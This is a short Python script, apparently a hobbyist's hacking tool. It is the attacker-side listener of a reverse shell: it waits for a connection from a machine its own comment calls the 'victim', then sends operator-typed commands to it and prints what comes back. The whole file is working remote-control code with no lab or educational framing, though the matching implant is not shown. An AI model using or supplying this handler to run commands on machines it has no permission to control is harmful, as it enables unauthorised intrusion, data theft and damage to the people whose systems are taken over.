# *****************************************
# *                                       *
# *   Created by   V A M S I              *
# *                                       *
# *****************************************
import socket

host = input("Enter your IP address to listen on: ")
port = int(input("Enter the port to listen on: "))

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(1)

print(f"[+] Listening on {host}:{port}...")
client_socket, client_address = server.accept()
print(f"[+] Connection established from {client_address[0]}:{client_address[1]}")

try:
    while True:
        command = input("Shell> ")
        if command.lower() == "exit":
            client_socket.send(command.encode())
            break

        client_socket.send(command.encode())

        # Receive and display output from victim
        output = client_socket.recv(4096).decode('utf-8', errors='ignore')
        print(output)
except Exception as e:
    print(f"[!] Error: {e}")
finally:
    client_socket.close()
    server.close()
